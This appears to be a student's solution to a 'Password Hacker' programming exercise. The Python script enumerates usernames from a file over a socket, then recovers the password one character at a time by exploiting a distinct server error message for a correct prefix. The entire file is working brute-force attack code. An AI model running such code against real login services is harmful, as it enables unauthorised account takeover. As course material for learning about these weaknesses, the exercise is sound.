import json
import socket
import string
import sys
from typing import TextIO
from _socket import SocketType


def brute_force(logins_file: TextIO, socket_obj: SocketType):
    credentials = find_login(logins_file, socket_obj)
    success = False
    while not success:
        for char in list(string.ascii_letters + string.digits):
            temp_pw = credentials["password"]
            temp_pw += char
            credentials_json = json.dumps({"login": credentials["login"], "password": temp_pw})
            socket_obj.send(credentials_json.encode())
            response = socket_obj.recv(1024).decode()
            if response == '{"result": "Exception happened during login"}':
                credentials["password"] = temp_pw
                break
            elif response == '{"result": "Connection success!"}':
                credentials["password"] = temp_pw
                success = True
                break
            else:
                continue
    return credentials


def find_login(logins_file: TextIO, socket_obj: SocketType):
    credentials = {"login": "", "password": ""}
    for login in logins_file:
        credentials["login"] = login.strip()
        credentials_json = json.dumps(credentials)
        socket_obj.send(credentials_json.encode())
        response = socket.recv(1024).decode()
        if response == '{"result": "Wrong password!"}':
            return credentials
        else:
            continue


ip, port = sys.argv[1], int(sys.argv[2])

with socket.socket() as socket,\
        open(r"C:\Users\Joao Marcos\PycharmProjects\Password Hacker\Password Hacker\task\logins.txt", "r") as logins:
    socket.connect((ip, port))
    print(json.dumps(brute_force(logins, socket)))
